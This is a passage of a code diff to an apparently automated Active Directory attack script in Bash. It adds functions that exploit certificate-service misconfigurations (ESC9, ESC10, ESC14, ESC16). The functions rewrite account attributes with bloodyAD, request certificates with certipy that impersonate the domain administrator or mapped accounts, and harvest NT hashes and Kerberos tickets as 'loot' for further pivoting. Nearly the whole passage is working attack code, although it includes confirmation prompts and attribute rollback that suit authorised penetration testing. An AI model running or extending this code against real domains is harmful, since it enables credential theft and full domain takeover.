 # otherwise authenticating as our own account is NOT an escalation → reject it.
-_adcs_pwn_pfx() {                       # _adcs_pwn_pfx <pfx-basename> <label> [selfok]
-    local pfx="$1" label="$2" selfok="${3:-0}"
+# identity_hint is needed for explicit mappings whose certificate has no UPN/DNS
+# SAN (RFC822 and IssuerSerial mappings). For backwards compatibility, a non-0/1
+# third argument is interpreted as the identity hint.
+_adcs_pwn_pfx() {                       # <pfx-basename> <label> [selfok] [identity_hint]
+    local pfx="$1" label="$2" selfok="${3:-0}" identity_hint="${4:-}"
+    if [[ "$selfok" != "0" && "$selfok" != "1" ]]; then identity_hint="$selfok"; selfok=0; fi
     [[ -z "$pfx" || ! -f "$OUTDIR/$pfx" ]] && { warn "  ${label}: no certificate produced"; return 1; }
-    run "certipy auth -pfx $pfx -dc-ip $DC_IP"
-    local aout; aout=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy auth -pfx "$pfx" -dc-ip "$DC_IP" 2>&1 ); echo "$aout" | tee -a "$LOGFILE"
+    local idargs=(); [[ -n "$identity_hint" ]] && idargs=(-username "$identity_hint" -domain "$DOMAIN")
+    run "certipy auth -pfx $pfx -dc-ip $DC_IP${identity_hint:+ -username $identity_hint -domain $DOMAIN}"
+    local aout; aout=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" \
+        certipy auth -pfx "$pfx" -dc-ip "$DC_IP" "${idargs[@]}" 2>&1 ); echo "$aout" | tee -a "$LOGFILE"
     # WHO did the cert actually authenticate as? (certipy may issue for the
     # requester, not the impersonated UPN, if the template forbids the SAN.)
     local who; who=$(grep -oiP "Got hash for '?\K[^'@ ]+" <<<"$aout" | head -1)
+    [[ -z "$who" ]] && who="$identity_hint"
+    who="${who##*\\}"; who="${who%%@*}"
+    # Certipy commonly returns both an NT hash and a freshly issued TGT. Keep
+    # the cache before taking the hash fast-path: protected/restricted users
+    # may reject NTLM and RC4 getTGT while the certificate TGT remains valid.
+    local ccname cc
+    ccname=$(grep -oiP "(?:Saving|Wrote) credential cache to '\K[^']+" <<<"$aout" | tail -1 | xargs -r basename)
+    [[ -n "$ccname" ]] && cc="$OUTDIR/$ccname"
+    [[ -z "$cc" && -n "$identity_hint" && -f "$OUTDIR/${identity_hint%\$}.ccache" ]] && cc="$OUTDIR/${identity_hint%\$}.ccache"
+    if [[ -n "$cc" && -f "$cc" ]] && grep -qiE 'Saving credential cache|Got TGT' <<<"$aout"; then
+        [[ -z "$who" ]] && who="${ccname%.ccache}"
+        [[ -n "$who" ]] && TICKET_CREDS["${who,,}"]="$cc"
+    fi
     local nt;  nt=$(grep -oiP 'Got hash for .*:\s*\K[a-f0-9]{32}:[a-f0-9]{32}' <<<"$aout" | awk -F: '{print $NF}' | head -1)
     if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ && -n "$who" ]]; then
         if [[ "${who,,}" == "${USER,,}" && "$selfok" != "1" ]]; then
@@ -4314,9 +4583,16 @@ _adcs_pwn_pfx() {                       # _adcs_pwn_pfx <pfx-basename> <label> [
         loot "★★★ ${label} → ${who} NT hash: ${C_MAGENTA}$nt${C_RESET}"
         note_cred_source "$who" "ADCS ${label} (certipy)"; queue_cred "$who" "" "$nt" "ADCS ${label}"; return 0
     fi
-    local cc; cc=$(ls -t "$OUTDIR"/*.ccache 2>/dev/null | head -1)
-    [[ -n "$cc" ]] && grep -qiE 'Saving credential cache|Got TGT' <<<"$aout" \
-        && { loot "${label} → TGT cached → $(basename "$cc") (export KRB5CCNAME=)"; return 0; }
+    if [[ -n "$cc" && -f "$cc" ]] && grep -qiE 'Saving credential cache|Got TGT' <<<"$aout"; then
+        [[ -z "$who" ]] && who="${ccname%.ccache}"
+        TICKET_CREDS["${who,,}"]="$cc"
+        rb_record "${label}: certificate issued/used for '${who}'" "echo 'Manual: revoke the issued certificate at the CA'"
+        loot "★★★ ${label} → ${who} certificate-issued TGT: $(basename "$cc")"
+        note_cred_source "$who" "ADCS ${label} (certificate TGT)"
+        unset "SEEN_CREDS[$(cred_key "$who" "" "")]"
+        queue_cred "$who" "" "" "ADCS ${label} (TGT)"
+        return 0
+    fi
     warn "  ${label}: cert issued but auth gave no usable hash/TGT — finish manually"; return 1
 }
 # Request a cert AS Administrator (SAN/UPN impersonation), then auth+pivot.
@@ -4354,6 +4630,241 @@ _adcs_req_admin() {                     # _adcs_req_admin <ca> <tpl> <label> <wi
         break
     done
     _adcs_pwn_pfx "$pfx" "$label"
+}
+
+# ESC9/ESC10/ESC16 weak mapping when the CA builds the subject from AD. The
+# template flags and live explicit mappings decide which certificate identity:
+#   * SubjectAltRequireUPN → temporarily use the domain RID-500 principal's UPN
+#   * Subject*RequireDNS  → temporarily use the discovered DC FQDN
+#   * Subject*RequireEmail + X509:<RFC822> mapping → copy that mapped address and
+#     request the mapped account's subject DN (ESC9→ESC14B)
+# No usernames, DC names, OUs or template names are embedded. The request is made
+# as the CURRENT identity without -upn/-dns, then every changed attribute is
+# restored before the certificate is authenticated and queued.
+_adcs_weak_mapping() {                  # <ca> <template> <ESC label> <find-output>
+    local ca="$1" tpl="$2" label="$3" cout="$4"
+    _adcs_setauth
+    local block; block=$(_adcs_template_block "$cout" "$tpl")
+    [[ -z "$block" ]] && { warn "  ${label}: could not parse template '$tpl' subject-name flags"; return 1; }
+
+    local need_upn=0 need_dns=0 need_mail=0
+    grep -qiE 'SubjectAltRequireUpn|SubjectRequireUpn' <<<"$block" && need_upn=1
+    grep -qiE 'SubjectAltRequireDns|SubjectRequireDns(AsCn)?' <<<"$block" && need_dns=1
+    grep -qiE 'SubjectAltRequireEmail|SubjectRequireEmail' <<<"$block" && need_mail=1
+    if [[ "$need_upn" != "1" && "$need_dns" != "1" && "$need_mail" != "1" ]]; then
+        warn "  ${label}: '$tpl' exposes no UPN/DNS/email subject flag that can be weak-mapped automatically"
+        return 1
+    fi
+
+    # Attribute writes should not depend on a fresh PAC/ccache when we already hold
+    # a password/hash. Fall back to the ticket only for ticket-only identities.
+    local -a mba=() menv=()
+    if [[ -n "$PASS$HASH" ]]; then
+        mapfile -t mba < <(bloody_args_plain); menv=(env -u KRB5CCNAME)
+    else
+        mapfile -t mba < <(bloody_args); menv=(env "KRB5CCNAME=$KERB_TICKET")
+    fi
+    [[ ${#mba[@]} -eq 0 ]] && return 1
+
+    local current rc
+    current=$("${menv[@]}" bloodyAD "${mba[@]}" get object "$USER" \
+        --attr userPrincipalName,dNSHostName,mail,objectClass,objectSid 2>&1); rc=$?
+    if (( rc != 0 )) || _bloody_failed "$current"; then
+        warn "  ${label}: cannot read the current account attributes needed for weak mapping"
+        printf '%s\n' "$current" >>"$LOGFILE"
+        return 1
+    fi
+
+    # ESC14B discovery is fully directory-driven: find weak RFC822 explicit
+    # mappings and select a mapped identity other than the requester. This covers
+    # email+subject templates where dNSHostName is illegal on a normal user object.
+    local explicit_sam="" explicit_dn="" explicit_email="" mapped=""
+    if [[ "$need_mail" == "1" ]]; then
+        mapped=$("${menv[@]}" bloodyAD "${mba[@]}" get search --filter '(altSecurityIdentities=*)' \
+            --attr distinguishedName,sAMAccountName,altSecurityIdentities 2>/dev/null)
+        IFS=$'\t' read -r explicit_sam explicit_dn explicit_email < <(awk -v cur="${USER,,}" '
+            BEGIN{RS=""; FS="\n"; OFS="\t"; IGNORECASE=1}
+            {dn=""; sam=""; email=""
+             for(i=1;i<=NF;i++) {
+               if($i ~ /^distinguishedName:[[:space:]]*/) {x=$i; sub(/^[^:]+:[[:space:]]*/,"",x); dn=x}
+               else if($i ~ /^sAMAccountName:[[:space:]]*/) {x=$i; sub(/^[^:]+:[[:space:]]*/,"",x); sam=x}
+               else if($i ~ /^altSecurityIdentities:[[:space:]]*/ && $i ~ /X509:<RFC822>/) {
+                 x=$i; sub(/^.*X509:<RFC822>/,"",x); sub(/[;[:space:]].*$/,"",x); email=x
+               }
+             }
+             if(dn!="" && sam!="" && email!="" && tolower(sam)!=cur) print sam,dn,email}' <<<"$mapped" | head -1)
+    fi
+
+    local target_upn="" target_dns="" target_desc="" identity_hint="" subject_dn=""
+    if [[ -n "$explicit_sam" ]]; then
+        target_desc="RFC822 ${explicit_email} → ${explicit_sam} (explicit mapping)"
+        identity_hint="$explicit_sam"; subject_dn="$explicit_dn"
+    elif [[ "$need_upn" == "1" ]]; then
+        local admin_sid admin_obj admin_sam current_sid
+        current_sid=$(_adcs_attr_value "$current" objectSid)
+        [[ "$current_sid" =~ ^S-1-5-21-([0-9]+-){3}[0-9]+$ ]] && admin_sid="${current_sid%-*}-500"
+        [[ -z "$admin_sid" ]] && admin_sid=$(_adcs_admin_sid)
+        [[ -z "$admin_sid" ]] && { warn "  ${label}: could not derive the domain RID-500 SID dynamically"; return 1; }
+        admin_obj=$("${menv[@]}" bloodyAD "${mba[@]}" get object "$admin_sid" --attr sAMAccountName,userPrincipalName 2>&1)
+        admin_sam=$(_adcs_attr_value "$admin_obj" sAMAccountName)
+        target_upn=$(_adcs_attr_value "$admin_obj" userPrincipalName)
+        [[ -z "$target_upn" && -n "$admin_sam" ]] && target_upn="${admin_sam}@${DOMAIN}"
+        [[ -z "$target_upn" ]] && { warn "  ${label}: RID-500 account has no resolvable UPN/sAMAccountName"; return 1; }
+        target_desc="UPN ${target_upn}"
+    fi
+    if [[ -z "$explicit_sam" && "$need_upn" != "1" && "$need_dns" != "1" ]]; then
+        warn "  ${label}: email is required, but no abusable RFC822 explicit mapping was discovered"
+        return 1
+    fi
+    if [[ -z "$explicit_sam" && "$need_dns" == "1" ]]; then
+        if grep -qiE 'objectClass:.*\buser\b' <<<"$current" && ! grep -qiE 'objectClass:.*\bcomputer\b' <<<"$current"; then
+            warn "  ${label}: '$USER' is a user object, so dNSHostName is schema-illegal; no RFC822 explicit mapping was found"
+            return 1
+        fi
+        target_dns="$DC_FQDN"
+        if [[ -z "$target_dns" && -n "$DC_HOST" ]]; then
+            local dc_obj
+            dc_obj=$("${menv[@]}" bloodyAD "${mba[@]}" get object "${DC_HOST}\$" --attr dNSHostName 2>/dev/null)
+            target_dns=$(_adcs_attr_value "$dc_obj" dNSHostName)
+        fi
+        [[ -z "$target_dns" ]] && { warn "  ${label}: no DC DNS identity was discovered"; return 1; }
+        [[ -n "$target_desc" ]] && target_desc+=" + "
+        target_desc+="DNS ${target_dns}"
+    fi
+
+    abuse_confirm "  ${label}: weak-map '$USER' via '$tpl' to ${target_desc}, request a certificate, then restore its attributes?" || return 1
+    local -a change_attrs=() change_vals=() attrs=() old_vals=() had_vals=()
+    [[ -z "$explicit_sam" && "$need_upn" == "1" ]] && { change_attrs+=(userPrincipalName); change_vals+=("$target_upn"); }
+    [[ -z "$explicit_sam" && "$need_dns" == "1" ]] && { change_attrs+=(dNSHostName); change_vals+=("$target_dns"); }
+    if [[ "$need_mail" == "1" ]]; then
+        local mail_target="adautopwn-${RANDOM}@${DOMAIN}"
+        if [[ -n "$explicit_email" ]]; then mail_target="$explicit_email"
+        elif [[ -n "$target_upn" ]]; then mail_target="$target_upn"; fi
+        change_attrs+=(mail); change_vals+=("$mail_target")
+    fi
+
+    local i attr new old had set_out set_rc
+    for ((i=0; i<${#change_attrs[@]}; i++)); do
+        attr="${change_attrs[$i]}"; new="${change_vals[$i]}"
+        old=$(_adcs_attr_value "$current" "$attr"); had=0; [[ -n "$old" ]] && had=1
+        [[ "$old" == "$new" ]] && continue
+        run "bloodyAD <current-auth> set object '$USER' '$attr' -v '$new'  # temporary ${label} mapping"
+        set_out=$("${menv[@]}" bloodyAD "${mba[@]}" set object "$USER" "$attr" -v "$new" 2>&1); set_rc=$?
+        printf '%s\n' "$set_out" | tee -a "$LOGFILE"
+        if (( set_rc != 0 )) || _bloody_failed "$set_out"; then
+            warn "  ${label}: could not set temporary ${attr} on '$USER'"
+            _adcs_restore_attrs "$USER" mba menv attrs old_vals had_vals
+            return 1
+        fi
+        attrs+=("$attr"); old_vals+=("$old"); had_vals+=("$had")
+    done
+
+    local stem="adcs_$(_safe_name "${label}_${USER}_${RANDOM}")" out="" pfx="" attempt
+    local rargs=(req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" -out "$stem" \
+        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}")
+    [[ -n "$subject_dn" ]] && rargs+=(-subject "$subject_dn")
+    run "certipy req <current-auth> -ca '$ca' -template '$tpl' -out '$stem'  # subject built from temporary AD attributes"
+    for attempt in 1 2 3 4; do
+        out=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy "${rargs[@]}" 2>&1 )
+        printf '%s\n' "$out" | tee -a "$LOGFILE"
+        pfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$out" | tail -1 | xargs -r basename)
+        [[ -z "$pfx" && -f "$OUTDIR/${stem}.pfx" ]] && pfx="${stem}.pfx"
+        [[ -n "$pfx" && -f "$OUTDIR/$pfx" ]] && break
+        grep -qiE 'TEMPLATE_DENIED|ACCESS_DENIED|[[:space:]]denied|not allowed|CERTSRV_E' <<<"$out" && break
+        if grep -qiE 'timed out|NETBIOS|connection (was )?reset|connection refused|rpc_s_|ProtocolError|broken pipe|unreachable|KRB_AP_ERR|RPC_E' <<<"$out" && (( attempt < 4 )); then
+            warn "  ${label}: transient enrollment transport error (${attempt}/4) → retrying in 6s…"
+            sleep 6
+            continue
+        fi
+        break
+    done
+
+    # Restore BEFORE cert authentication/pivoting, even when enrollment failed.
+    _adcs_restore_attrs "$USER" mba menv attrs old_vals had_vals || true
+    [[ -z "$pfx" || ! -f "$OUTDIR/$pfx" ]] && { warn "  ${label}: no weak-mapped certificate was issued"; return 1; }
+    ADCS_REUSABLE_PFX="$OUTDIR/$pfx"
+    loot "★ ${label}: weak-mapped certificate issued via ${target_desc}; original attributes restored"
+    _adcs_pwn_pfx "$pfx" "${label} weak mapping" 0 "$identity_hint"
+}
+
+# Build the strong X509IssuerSerialNumber altSecurityIdentities form from a PFX.
+# AD expects the issuer in the certificate's displayed (slash) order and the
+# serial number byte-reversed. Both values come from the live certificate.
+_adcs_strong_mapping() {                # <pfx-path>
+    local pfx="$1" meta issuer serial rev
+    have openssl || return 1
+    meta=$(openssl pkcs12 -in "$pfx" -clcerts -nokeys -passin pass: 2>/dev/null \
+        | openssl x509 -noout -issuer -serial -nameopt compat 2>/dev/null) || return 1
+    issuer=$(sed -n 's/^issuer=//p' <<<"$meta" | head -1)
+    issuer=$(sed 's#^/##; s#/#,#g' <<<"$issuer")
+    serial=$(sed -n 's/^serial=//p' <<<"$meta" | head -1 | tr -d '[:space:]')
+    [[ -z "$issuer" || ! "$serial" =~ ^[0-9A-Fa-f]+$ ]] && return 1
+    (( ${#serial} % 2 )) && serial="0${serial}"
+    rev=$(fold -w2 <<<"$serial" | tac | tr -d '\n')
+    printf 'X509:<I>%s<SR>%s\n' "$issuer" "$rev"
+}
+
+# ESC14: when the current principal can write a target's explicit certificate
+# mapping, map the already-issued client-auth PFX to that target, authenticate,
+# then restore the original attribute. The target, certificate issuer and serial
+# are all discovered at runtime. Ticket-only results are fed back into the queue.
+_abuse_altsecid() {                     # <target-sAMAccountName> <target-DN>
+    local target="$1" target_dn="${2:-$1}" key="${USER,,}|${1,,}"
+    [[ -z "$target" || "${target,,}" == "${USER,,}" ]] && return 1
+    [[ -n "${ALTSECID_DONE[$key]:-}" ]] && return 0
+    if [[ "$DO_ABUSE" != "1" ]]; then
+        info "  (report-only; --abuse maps a reusable PFX to '$target', authenticates, then restores altSecurityIdentities)"
+        return 1
+    fi
+    [[ -n "$ADCS_REUSABLE_PFX" && -f "$ADCS_REUSABLE_PFX" ]] || {
+        info "  ESC14 on '$target' found, but no reusable client-auth PFX has been issued in this run yet"
+        return 1
+    }
+    local mapping; mapping=$(_adcs_strong_mapping "$ADCS_REUSABLE_PFX")
+    [[ -z "$mapping" ]] && { warn "  could not derive IssuerSerial mapping from $(basename "$ADCS_REUSABLE_PFX")"; return 1; }
+    abuse_confirm "  ESC14: temporarily map $(basename "$ADCS_REUSABLE_PFX") to '$target', authenticate, then restore the original mapping?" || return 1
+
+    local ba; mapfile -t ba < <(bloody_args)
+    local before line old_blob="" set_out set_rc
+    before=$(bloodyAD "${ba[@]}" get object "$target_dn" --attr altSecurityIdentities 2>/dev/null)
+    line=$(grep -i '^altSecurityIdentities:' <<<"$before" | head -1)
+    [[ -n "$line" ]] && { old_blob="${line#*:}"; old_blob="${old_blob# }"; }
+
+    run "bloodyAD <current-auth> set object '$target_dn' altSecurityIdentities -v '<IssuerSerial from PFX>'"
+    set_out=$(bloodyAD "${ba[@]}" set object "$target_dn" altSecurityIdentities -v "$mapping" 2>&1); set_rc=$?
+    printf '%s\n' "$set_out" | tee -a "$LOGFILE"
+    if (( set_rc != 0 )) || _bloody_failed "$set_out"; then
+        warn "  ESC14: could not write altSecurityIdentities on '$target'"
+        return 1
+    fi
+    ALTSECID_DONE["$key"]=1
+
+    local -a restore_args=(bloodyAD "${ba[@]}" set object "$target_dn" altSecurityIdentities)
+    local -a old_values=(); local ov undo
+    if [[ -n "$old_blob" ]]; then
+        IFS=';' read -ra old_values <<<"$old_blob"
+        for ov in "${old_values[@]}"; do
+            ov="${ov#${ov%%[![:space:]]*}}"; ov="${ov%${ov##*[![:space:]]}}"
+            [[ -n "$ov" ]] && restore_args+=(-v "$ov")
+        done
+    fi
+    printf -v undo '%q ' "${restore_args[@]}"
+    rb_record "ESC14: mapped certificate to $target via altSecurityIdentities" "$undo"
+    loot "★ ESC14 mapping installed on '$target' from $(basename "$ADCS_REUSABLE_PFX")"
+
+    _adcs_setauth
+    local pwn_rc=1
+    _adcs_pwn_pfx "$(basename "$ADCS_REUSABLE_PFX")" "ESC14 explicit mapping" 0 "$target" && pwn_rc=0
+
+    local restore_out restore_rc
+    restore_out=$("${restore_args[@]}" 2>&1); restore_rc=$?
+    printf '%s\n' "$restore_out" >>"$LOGFILE"
+    if (( restore_rc != 0 )) || _bloody_failed "$restore_out"; then
+        warn "  ESC14 succeeded/attempted, but the original altSecurityIdentities on '$target' needs manual rollback"
+    else
+        ok "Restored '$target' altSecurityIdentities"
+    fi
+    return "$pwn_rc"
 }
 
 # ESC3 — Enrollment Agent: get an agent cert, then request On-Behalf-Of Administrator.
@@ -4642,7 +5153,7 @@ _abuse_adcs() {
         tpl=$(_adcs_template_for "$cout" "$esc"); [[ -z "$tpl" ]] && tpl="User"
         case "$esc" in
             ESC1|ESC2|ESC6)  _adcs_req_admin "$ca" "$tpl" "$esc" 1 && return 0 ;;   # SAN impersonation (+SID)
-            ESC9|ESC10|ESC16) _adcs_req_admin "$ca" "$tpl" "$esc" 0 && return 0 ;;  # missing SID extension → UPN map
+            ESC9|ESC10|ESC16) _adcs_weak_mapping "$ca" "$tpl" "$esc" "$cout" && return 0 ;;
             ESC15) local _obo; _obo=$(_adcs_clientauth_tpl "$cout" | grep -ixF 'User' | head -1)
                    [[ -z "$_obo" ]] && _obo=$(_adcs_clientauth_tpl "$cout" | head -1)
                    [[ -z "$_obo" ]] && _obo="User"
@@ -7313,7 +7824,13 @@ assess_current_credential() {
         return
     fi
     SEEN_CREDS["$(cred_key "$USER" "$PASS" "$HASH")"]=1
-    HAVE_AUTH=0; IS_DC_ADMIN=0; KERB_TICKET=""; unset KRB5CCNAME
+    local _seed_ticket="${TICKET_CREDS[$_ak]:-}"
+    HAVE_AUTH=0; IS_DC_ADMIN=0; KERB_TICKET=""
+    if [[ -n "$_seed_ticket" && -f "$_seed_ticket" ]]; then
+        KERB_TICKET="$_seed_ticket"; export KRB5CCNAME="$KERB_TICKET"
+    else
+        unset KRB5CCNAME
+    fi
 
     section "ASSESSING IDENTITY · ${USER}"
     info "Credential: ${C_BOLD}${USER}${C_RESET} $( [[ -n "$HASH" ]] && echo '(NT hash / PtH)' || echo '(password)')"
